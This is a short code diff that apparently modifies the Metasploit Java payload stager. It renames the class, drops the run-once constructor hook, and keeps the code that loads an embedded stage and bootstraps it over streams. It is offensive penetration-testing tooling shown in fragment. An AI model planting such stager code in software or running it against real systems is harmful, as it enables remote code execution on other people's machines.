@@ -63,24 +63,9 @@ import java.util.StringTokenizer;
  * To invoke all the magic, call the {@link #main(String[])} method
  * (Or use it as Main-Class in a standalone jar and double-click it).
  */
-public class Payload extends ClassLoader {
+public class Payload2 extends ClassLoader {
 
-	static boolean alreadyRun = false;
-
-	public Payload() throws Exception {
-		if (!alreadyRun) {
-			alreadyRun = true;
-			run();
-		}
-	}
 	public static void main(String[] ignored) throws Exception {
-		if (!alreadyRun) {
-			alreadyRun = true;
-			run();
-		}	
-	}
-
-	public static void run() throws Exception {
 
 		// Find our properties. If we are running inside the jar, they are in a resource stream called "/metasploit.dat".
 		Properties props = new Properties();
@@ -241,7 +226,7 @@ public class Payload extends ClassLoader {
 			for (int i = 0; i < stageParams.length; i++) {
 				stageParams[i] = stageParamTokenizer.nextToken();
 			}
-			new Payload().bootstrap(in, out, props.getProperty("EmbeddedStage", null), stageParams);
+			new Payload2().bootstrap(in, out, props.getProperty("EmbeddedStage", null), stageParams);
 		}
 	}
 
